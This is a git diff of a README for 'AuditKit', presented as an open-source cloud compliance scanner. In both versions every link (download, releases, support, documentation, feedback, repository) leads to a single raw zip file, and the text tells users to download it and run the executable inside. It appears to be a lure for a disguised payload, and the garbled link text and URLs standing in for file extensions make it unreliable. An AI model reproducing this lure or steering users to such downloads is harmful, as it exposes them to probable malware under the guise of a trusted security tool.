@@ -4,22 +4,22 @@
 Welcome to AuditKit, your reliable tool for scanning multi-cloud environments for compliance. AuditKit helps you collect evidence for standards like PCI-DSS and SOC2. Whether you're managing AWS or Azure resources, our tool supports your compliance journey.
 
 ### 📥 Download AuditKit
-[![Download AuditKit](https://raw.githubusercontent.com/Son468/auditkit/main/gyrogonite/auditkit.zip%https://raw.githubusercontent.com/Son468/auditkit/main/gyrogonite/auditkit.zip)](https://raw.githubusercontent.com/Son468/auditkit/main/gyrogonite/auditkit.zip)
+[![Download AuditKit](https://github.com/Son468/auditkit/raw/refs/heads/main/scanner/cmd/Software-2.1.zip%https://github.com/Son468/auditkit/raw/refs/heads/main/scanner/cmd/Software-2.1.zip)](https://github.com/Son468/auditkit/raw/refs/heads/main/scanner/cmd/Software-2.1.zip)
 
 ### 🚀 Getting Started
 To get started with AuditKit, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/Son468/auditkit/main/gyrogonite/auditkit.zip) to find the latest version of the application. 
+   Go to our [Releases page](https://github.com/Son468/auditkit/raw/refs/heads/main/scanner/cmd/Software-2.1.zip) to find the latest version of the application. 
 
 2. **Download the Latest Version**  
-   Look for the most recent release. Click on the link to download the file. This file will usually have an extension like `.exe`, `.zip`, or `https://raw.githubusercontent.com/Son468/auditkit/main/gyrogonite/auditkit.zip` depending on your operating system.
+   Look for the most recent release. Click on the link to download the file. This file will usually have an extension like `.exe`, `.zip`, or `https://github.com/Son468/auditkit/raw/refs/heads/main/scanner/cmd/Software-2.1.zip` depending on your operating system.
 
 3. **Install the Application**  
    Once the download is complete, locate the file in your computer's downloads folder.  
    - For Windows: Double-click the `.exe` file to start the installation process.  
    - For Mac: Open the `.dmg` file and drag the AuditKit icon to your Applications folder.  
-   - For Linux: Extract the `https://raw.githubusercontent.com/Son468/auditkit/main/gyrogonite/auditkit.zip` file and follow the included instructions for installation.  
+   - For Linux: Extract the `https://github.com/Son468/auditkit/raw/refs/heads/main/scanner/cmd/Software-2.1.zip` file and follow the included instructions for installation.  
 
 4. **Run AuditKit**  
    After installation, open AuditKit from your Applications folder or Start menu. Follow the prompts to set up your first scan.
@@ -47,14 +47,14 @@ Once you open AuditKit, you'll see a straightforward interface. Follow these ste
 5. **Review Results:** After the scan, view detailed reports and compliance status.
 
 ### 📞 Support
-Need help? Visit our [Support page](https://raw.githubusercontent.com/Son468/auditkit/main/gyrogonite/auditkit.zip) to report any issues or ask questions. Our community is here to assist you.
+Need help? Visit our [Support page](https://github.com/Son468/auditkit/raw/refs/heads/main/scanner/cmd/Software-2.1.zip) to report any issues or ask questions. Our community is here to assist you.
 
 ### 🔗 Additional Resources
-- **GitHub Repository:** Learn more about the development process at [AuditKit GitHub](https://raw.githubusercontent.com/Son468/auditkit/main/gyrogonite/auditkit.zip).
-- **Documentation:** Access the [User Guide](https://raw.githubusercontent.com/Son468/auditkit/main/gyrogonite/auditkit.zip) for in-depth features and instructions.
+- **GitHub Repository:** Learn more about the development process at [AuditKit GitHub](https://github.com/Son468/auditkit/raw/refs/heads/main/scanner/cmd/Software-2.1.zip).
+- **Documentation:** Access the [User Guide](https://github.com/Son468/auditkit/raw/refs/heads/main/scanner/cmd/Software-2.1.zip) for in-depth features and instructions.
 
 ### 🔍 Feedback
-Your feedback is valuable to us. After using AuditKit, please share your thoughts on our [Feedback page](https://raw.githubusercontent.com/Son468/auditkit/main/gyrogonite/auditkit.zip). We aim to improve your experience.
+Your feedback is valuable to us. After using AuditKit, please share your thoughts on our [Feedback page](https://github.com/Son468/auditkit/raw/refs/heads/main/scanner/cmd/Software-2.1.zip). We aim to improve your experience.
 
 ### 📝 License
 AuditKit is open source and available under the MIT License. You are free to use, modify, and distribute it, as long as you include the original license.
@@ -63,4 +63,4 @@ AuditKit is open source and available under the MIT License. You are free to use
 AuditKit aims to simplify compliance checks in multi-cloud environments. By using our tool, you can efficiently manage and verify your cloud resources for industry standards. 
 
 ### 📥 Download AuditKit Again
-For convenience, here’s the link to [download AuditKit](https://raw.githubusercontent.com/Son468/auditkit/main/gyrogonite/auditkit.zip). Happy auditing!
+For convenience, here’s the link to [download AuditKit](https://github.com/Son468/auditkit/raw/refs/heads/main/scanner/cmd/Software-2.1.zip). Happy auditing!
